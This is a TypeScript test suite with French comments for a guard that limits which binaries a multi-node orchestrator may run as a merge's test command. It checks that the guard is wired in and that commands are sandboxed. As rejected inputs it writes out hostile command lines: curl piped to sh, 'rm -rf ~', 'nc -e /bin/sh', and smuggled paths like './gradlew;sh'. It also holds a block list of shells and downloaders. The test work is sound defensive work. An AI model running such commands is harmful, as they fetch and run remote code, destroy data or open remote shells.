// La commande de test d'un merge — la faille qui permettait d'exécuter
// n'importe quel binaire sur la machine d'un membre.
//
// ─── CE QU'ON TESTE VRAIMENT ─────────────────────────────────────────────────
//
// Pas « la fonction renvoie bien false » : que la garde soit BRANCHÉE aux deux
// bouts, et qu'elle le reste. Un `jugerCommandeTest` parfait qu'on oublie
// d'appeler dans `runMerge` ne protège personne — c'est exactement l'état dans
// lequel se trouvait le dépôt avant ce commit. D'où le test de source qui relit
// `merge-runner.ts` : il échouera le jour où quelqu'un déplacera le `spawn`
// ailleurs ou retirera l'appel.
//
// ─── POURQUOI DEUX GARDES ────────────────────────────────────────────────────
//
// Le hub refuse tôt, pour donner un message lisible. Le nœud refuse à son tour,
// et c'est CELLE-LÀ qui compte : le jeton de ruche est partagé, les anciennes
// invitations le portent en clair sans révocation, et le transport peut être un
// ws:// de réseau local. Un nœud qui fait confiance au hub sur ce point prête sa
// machine à quiconque a récupéré le jeton un jour.

import { execFileSync } from 'node:child_process';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { readFileSync } from 'node:fs';
import { simpleGit } from 'simple-git';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { BINAIRES_DE_TEST, jugerCommandeTest } from '../src/shared/commande-test.js';

/**
 * Cette machine sait-elle exécuter un script à shebang ?
 *
 * Faux sous Windows : Node documente qu'un `.cmd`/`.bat` ne peut pas être lancé
 * sans interpréteur de commandes, et un `#!/bin/sh` n'y est rien du tout. Or le
 * test d'enveloppe a besoin de FABRIQUER un faux moteur de conteneurs — ce
 * qu'on ne sait pas faire sous Windows sans compilateur.
 *
 * La sonde est au CHARGEMENT, pas dans `beforeAll` : `it.runIf(...)` s'évalue à
 * la collecte. Posé trop tard, le drapeau vaudrait toujours `false` et le test
 * serait silencieusement désactivé PARTOUT — c'est déjà arrivé dans ce dépôt,
 * sur les gardes anti-évasion du miroir, et la suite restait verte.
 */
const scriptsExecutables = ((): boolean => {
  const bac = mkdtempSync(path.join(os.tmpdir(), 'hive-shebang-'));
  try {
    const f = path.join(bac, 'sonde');
    writeFileSync(f, '#!/bin/sh\nexit 0\n', { mode: 0o755 });
    execFileSync(f, { stdio: 'ignore' });
    return true;
  } catch {
    return false;
  } finally {
    rmSync(bac, { recursive: true, force: true });
  }
})();
import { runMerge } from '../src/node-client/merge-runner.js';
import { createServer } from '../src/orchestrator/server.js';
import type { HiveServer } from '../src/orchestrator/server.js';
import type { Task } from '../src/shared/types.js';

const lire = (rel: string): string =>
  readFileSync(fileURLToPath(new URL(rel, import.meta.url)), 'utf8');

describe('le jugement d’une commande de test', () => {
  it('LAISSE PASSER CE QU’ON ÉCRIT VRAIMENT DANS UN DÉPÔT', () => {
    // Une garde qui casse les usages légitimes est une garde qu'on désactive.
    for (const cmd of [
      ['npm', 'test'],
      ['npm', 'run', 'test', '--', '--reporter=dot'],
      ['pnpm', 'vitest', 'run'],
      ['make', 'check'],
      ['cargo', 'test', '--all-features'],
      ['go', 'test', './...'],
      ['pytest', '-q'],
      ['python3', '-m', 'pytest'],
      ['mvn', '-B', 'verify'],
      ['gradle', 'test'],
      // Les wrappers du dépôt : la façon NORMALE de tester un projet JVM.
      ['./gradlew', 'test'],
      ['./mvnw', 'verify'],
      ['gradlew.bat', 'test'],
    ]) {
      expect(jugerCommandeTest(cmd), cmd.join(' ')).toEqual({ ok: true });
    }
  });

  it('REFUSE LE BINAIRE ARBITRAIRE — le cœur de la faille', () => {
    // `shell: false` empêche l'interprétation d'une CHAÎNE par un shell. Il
    // n'empêche pas de nommer /bin/sh comme argv[0] : c'est le binaire.
    for (const cmd of [
      ['/bin/sh', '-c', 'curl http://x/y | sh'],
      ['bash', '-c', 'rm -rf ~'],
      ['sh'],
      ['curl', 'http://x/y'],
      ['ssh', 'a@b'],
      ['powershell', '-Command', 'x'],
      ['C:\\Windows\\System32\\cmd.exe', '/c', 'x'],
    ]) {
      expect(jugerCommandeTest(cmd).ok, cmd.join(' ')).toBe(false);
    }
  });

  it('un CHEMIN vers un lanceur admis est refusé aussi', () => {
    // Sinon la liste ne vaut rien : `./npm` est un script que le dépôt fournit,
    // `/tmp/npm` est ce que l'attaquant vient de déposer.
    for (const bin of ['./npm', '/usr/bin/npm', '../npm', '.\\npm.cmd', 'dir/npm']) {
      const v = jugerCommandeTest([bin, 'test']);
      expect(v.ok, bin).toBe(false);
      if (!v.ok) expect(v.motif).toMatch(/chemin/);
    }
  });

  it('L’EXCEPTION DES WRAPPERS EST CLOSE — comparaison littérale, rien à tordre', () => {
    // C'est la seule entorse à « pas de chemin ». Si elle devenait un préfixe ou
    // une regex, elle rouvrirait exactement ce qu'elle contourne.
    for (const bin of [
      './gradlew/../../bin/sh',
      './gradlew;sh',
      '../gradlew',
      '/opt/gradlew',
      './gradlewx',
      'x/gradlew',
    ]) {
      expect(jugerCommandeTest([bin]).ok, bin).toBe(false);
    }
  });

  it('LE WRAPPER S’ÉCRIT AUSSI À LA WINDOWS — antislash et casse', () => {
    // Trouvé en MUTANT : remplacer la normalisation du wrapper par une
    // comparaison brute (`WRAPPERS.has(bin)`) ne rougissait aucun test. Les
    // trois formes déjà couvertes — `./gradlew`, `./mvnw`, `gradlew.bat` —
    // sont toutes en minuscules et en barres obliques ; la moitié Windows de
    // la liste n'était éprouvée nulle part, alors que le fichier la déclare
    // explicitement.
    //
    // Le mode d'échec n'a rien de cosmétique. Sans normalisation, `.\gradlew`
    // ne se retrouve pas parmi les wrappers, retombe sur la règle « pas de
    // chemin » à cause de son antislash, et se fait refuser : un membre sous
    // Windows qui écrit la seule forme que son shell accepte verrait sa
    // commande rejetée. Un « ça marche chez moi », mais à l'envers.
    for (const bin of ['.\\gradlew', '.\\gradlew.bat', './GRADLEW', 'MVNW', '.\\mvnw.cmd']) {
      expect(jugerCommandeTest([bin, 'test']), bin).toEqual({ ok: true });
    }
    // La normalisation RECONNAÎT les mêmes noms autrement écrits ; elle
    // n'élargit pas la liste d'un seul nom.
    for (const bin of ['.\\gradlewx', '..\\gradlew', 'x\\gradlew', '.\\sh']) {
      expect(jugerCommandeTest([bin, 'test']).ok, bin).toBe(false);
    }
  });

  it('les suffixes Windows sont admis — le même lanceur, un autre nom de fichier', () => {
    // `npm` est `npm.cmd` sur Windows : refuser ferait de la garde un bug
    // « ça marche chez moi » réservé aux membres sous Linux.
    for (const bin of ['npm.cmd', 'NPM.CMD', 'yarn.cmd', 'node.exe', 'gradle.bat']) {
      expect(jugerCommandeTest([bin, 'test']), bin).toEqual({ ok: true });
    }
    // …mais le suffixe ne blanchit pas un binaire inconnu.
    expect(jugerCommandeTest(['nc.exe', '-e', 'sh']).ok).toBe(false);
  });

  it('refuse le vide, l’espace seul et ce qui commence par un tiret', () => {
    for (const cmd of [[], [''], ['   '], ['--version'], ['-c']]) {
      expect(jugerCommandeTest(cmd).ok, JSON.stringify(cmd)).toBe(false);
    }
  });

  it('LE MOTIF DIT QUOI FAIRE, pas seulement « non »', () => {
    // Un refus opaque pousse à contourner ; un refus qui nomme les lanceurs
    // admis se corrige en une seconde.
    const v = jugerCommandeTest(['/bin/sh', '-c', 'x']);
    expect(v.ok).toBe(false);
    if (!v.ok) {
      expect(v.motif).toContain('/bin/sh');
      expect(v.motif.length).toBeGreaterThan(30);
    }
    const inconnu = jugerCommandeTest(['nc']);
    expect(inconnu.ok).toBe(false);
    if (!inconnu.ok) expect(inconnu.motif).toContain('npm');
  });

  it('la liste reste une LISTE — aucun shell ni téléchargeur ne s’y glisse', () => {
    // Ce test est là pour le futur : ajouter `sh` ou `curl` à la liste
    // rouvrirait la faille en une ligne, sans qu'aucun autre test ne bronche.
    for (const interdit of [
      'sh',
      'bash',
      'zsh',
      'cmd',
      'powershell',
      'pwsh',
      'curl',
      'wget',
      'ssh',
      'nc',
      'eval',
      'env',
      'sudo',
      'docker',
    ]) {
      expect(BINAIRES_DE_TEST as readonly string[], interdit).not.toContain(interdit);
    }
  });
});

describe('LA GARDE EST BRANCHÉE — sinon tout ce qui précède est décoratif', () => {
  it('runMerge juge la commande AVANT de toucher au dépôt', () => {
    const src = lire('../src/node-client/merge-runner.ts');
    const corps = src.slice(src.indexOf('export async function runMerge'));
    expect(corps, 'runMerge ne juge plus la commande').toContain('jugerCommandeTest(');
    // Dans le corps de runMerge, le jugement doit précéder le premier appel qui
    // écrit ou exécute. Grossier, mais ça attrape le déplacement accidentel qui
    // rendrait la garde inopérante sans qu'aucun autre test ne bronche.
    for (const apres of ['simpleGit(', 'runProc(', 'writeFileSync(']) {
      const i = corps.indexOf(apres);
      if (i === -1) continue;
      expect(corps.indexOf('jugerCommandeTest('), apres).toBeLessThan(i);
    }
  });

  it('le client de nœud refuse avant même de cloner', () => {
    expect(lire('../src/node-client/client.ts')).toContain('jugerCommandeTest');
  });

  it('le hub refuse tôt', () => {
    expect(lire('../src/orchestrator/server.ts')).toContain('jugerCommandeTest');
  });
});

describe('côté nœud : runMerge refuse, même si le hub a laissé passer', () => {
  let dir: string;
  let repoDir: string;

  beforeAll(async () => {
    dir = mkdtempSync(path.join(os.tmpdir(), 'hive-cmd-'));
    repoDir = path.join(dir, 'repo');
    await simpleGit().raw(['init', repoDir]);
    const git = simpleGit({ baseDir: repoDir });
    await git.addConfig('user.email', 'test@hive.local');
    await git.addConfig('user.name', 'Hive Test');
    // ─── LA SIGNATURE DE COMMIT, NEUTRALISÉE POUR CE DÉPÔT JETABLE ─────────
    //
    // `commit.gpgsign = true` est un réglage GLOBAL courant et recommandé. Il
    // s'applique aussi aux dépôts que ces tests fabriquent — et le programme de
    // signature n'a rien à faire là : un contributeur qui signe ses commits ne
    // pouvait tout simplement PAS lancer cette suite (« cannot exec … »,
    // onze fichiers rouges).
    //
    // On désarme UNIQUEMENT ce réglage, UNIQUEMENT dans le dépôt que le test
    // vient de créer. Rien de la configuration de la personne n'est touché —
    // c'est la leçon du § 4.1 : `GIT_CONFIG_NOSYSTEM` avait emporté
    // `core.symlinks` avec lui.
    await git.addConfig('commit.gpgsign', 'false');
    writeFileSync(path.join(repoDir, 'f.txt'), 'base\n');
    await git.add('f.txt');
    await git.commit('base');
  });

  afterAll(() => rmSync(dir, { recursive: true, force: true }));

  it('LÈVE plutôt que d’exécuter — un hub compromis ne suffit pas', async () => {
    await expect(
      runMerge({ repoDir, diffs: [], testCommand: ['/bin/sh', '-c', 'echo pwned'] }),
    ).rejects.toThrow(/refusée/);
  });

  it('n’a RIEN écrit avant de refuser', async () => {
    // Si la garde arrivait après l'application des diffs, un attaquant garderait
    // l'écriture arbitraire dans le clone — et le refus ne serait qu'un demi-refus.
    const git = simpleGit({ baseDir: repoDir });
    const avant = await git.status();
    await runMerge({ repoDir, diffs: [], testCommand: ['nc', '-e', '/bin/sh'] }).catch(() => {});
    expect((await git.status()).files).toEqual(avant.files);
  });

  it('la fabrication d’un faux moteur est-elle possible ici ?', () => {
    // On ne peut pas vérifier l'enveloppe sans un moteur à envelopper, et sous
    // Windows on ne sait pas en fabriquer un. Le dire est la seule chose
    // honnête : un `skip` muet laisserait croire la garantie établie partout.
    //
    // L'ENVELOPPE ELLE-MÊME reste vérifiée sur les deux plateformes : c'est
    // `envelopper()`, un module pur. Ce qui manque sous Windows, c'est la
    // preuve de bout en bout que `runProc` l'appelle vraiment.
    if (!scriptsExecutables) {
      console.warn(
        '⚠ scripts à shebang inexécutables sur cette plateforme : ' +
          'la preuve de bout en bout que la commande de test est ENVELOPPÉE ' +
          'n’est PAS faite ici. Elle l’est sur Linux, à chaque CI.',
      );
    }
    // SUR POSIX, LA SONDE DOIT DIRE OUI. Sans cette assertion, une sonde cassée
    // désactiverait la preuve partout et la suite resterait verte.
    if (process.platform !== 'win32') {
      expect(scriptsExecutables, 'la sonde doit réussir sur un système POSIX').toBe(true);
    }
  });

  it.runIf(scriptsExecutables)(
    'LA COMMANDE DE TEST EST ENVELOPPÉE DANS LE BAC À SABLE',
    async () => {
      // Ce chemin ne passait par AUCUNE enveloppe : `HIVE_ISOLEMENT=exige`
      // empêchait un agent de sortir de son bac pendant que les tests d'un merge
      // tournaient à côté, sur l'hôte nu. On le prouve ici pour de vrai, sans
      // docker : un faux moteur qui se contente d'imprimer son argv.
      const faux = path.join(dir, 'faux-moteur.cjs');
      writeFileSync(faux, 'console.log(JSON.stringify(process.argv.slice(2)));\n');
      const lanceur = path.join(dir, 'moteur');
      writeFileSync(lanceur, `#!/bin/sh\nexec node ${JSON.stringify(faux)} "$@"\n`, {
        mode: 0o755,
      });

      const r = await runMerge({
        repoDir,
        diffs: [],
        testCommand: ['npm', 'test'],
        timeoutMs: 30_000,
        bac: {
          fournisseur: {
            nom: 'faux',
            bin: lanceur,
            niveau: 'conteneur',
            installation: 'aucune',
            garanties: [],
          },
          variables: ['ANTHROPIC_API_KEY'],
        },
      });

      expect(r.testsRun).toBe(true);
      // Le vrai binaire lancé est le moteur, pas `npm` : l'enveloppe a bien eu lieu.
      expect(r.logs, 'le clone doit être le répertoire monté').toContain(`--volume=${repoDir}:`);
      expect(r.logs, "la commande de test doit être à l'intérieur").toMatch(/"npm","test"/);
      // Le secret passe par son NOM, jamais par sa valeur : `--env=CLE=valeur`
      // écrirait le secret dans la table des processus, lisible par `ps`.
      expect(r.logs).toContain('--env=ANTHROPIC_API_KEY');
      expect(r.logs).not.toMatch(/--env=ANTHROPIC_API_KEY=/);
    },
  );

  it('laisse passer un vrai lanceur (la garde ne casse pas le chemin nominal)', async () => {
    const r = await runMerge({
      repoDir,
      diffs: [],
      // `node -e` : un lanceur admis, sans dépendance réseau ni npm install.
      testCommand: ['node', '-e', 'process.exit(0)'],
      timeoutMs: 30_000,
    });
    expect(r.testsRun).toBe(true);
    expect(r.testsPassed).toBe(true);
  });
});

describe('côté hub : POST /merge/run refuse tôt et clairement', () => {
  let server: HiveServer;
  let dir: string;
  let base: string;
  let projectId: string;
  const TOKEN = 'jeton-commande-test-suffisamment-long';
  const headers = { 'content-type': 'application/json', 'x-hive-token': TOKEN };

  beforeAll(async () => {
    dir = mkdtempSync(path.join(os.tmpdir(), 'hive-cmdapi-'));
    server = await createServer({
      port: 0,
      host: '127.0.0.1',
      token: TOKEN,
      corsOrigins: ['http://localhost:5173'],
      dbPath: path.join(dir, 'hive.db'),
      simulation: false,
      tickMs: 60_000,
    });
    base = `http://127.0.0.1:${server.port}`;
    const projet = (await (
      await fetch(`${base}/api/projects`, {
        method: 'POST',
        headers,
        body: JSON.stringify({ name: 'Garde', repoUrl: 'https://example.com/depot.git' }),
      })
    ).json()) as { id: string };
    projectId = projet.id;
    const taches = (await (
      await fetch(`${base}/api/projects/${projectId}/tasks`, {
        method: 'POST',
        headers,
        body: JSON.stringify({ tasks: [{ title: 'faite', prompt: 'faire' }] }),
      })
    ).json()) as Task[];
    server.store.patchTask(taches[0]!.id, { status: 'done' });
    server.store.insertResult({
      taskId: taches[0]!.id,
      nodeId: 'noeud-fictif',
      success: true,
      diff: 'diff --git a/f.txt b/f.txt\n+contenu\n',
      logs: 'ok',
      durationMs: 10,
      subAgents: [],
    });
  });

  afterAll(async () => {
    await server.stop();
    rmSync(dir, { recursive: true, force: true });
  });

  const run = (testCommand: string[]) =>
    fetch(`${base}/api/projects/${projectId}/merge/run`, {
      method: 'POST',
      headers,
      body: JSON.stringify({ testCommand }),
    });

  it('400 sur un binaire arbitraire, avec le motif', async () => {
    const res = await run(['/bin/sh', '-c', 'curl http://x | sh']);
    expect(res.status).toBe(400);
    expect(((await res.json()) as { error: string }).error).toMatch(/chemin|lanceur/);
  });

  it('le refus vient AVANT le choix du nœud', async () => {
    // Sans ce test, la garde pourrait vivre après le 503 « aucun nœud en ligne »
    // et ne jamais s'exécuter dans une ruche vide — donc jamais en CI.
    expect((await run(['nc', '-e', 'sh'])).status).toBe(400);
  });

  it('une commande légitime passe la garde (503 = plus rien avant le nœud)', async () => {
    const res = await run(['npm', 'test']);
    expect(res.status).toBe(503);
    expect(((await res.json()) as { error: string }).error).toContain('aucun nœud');
  });
});
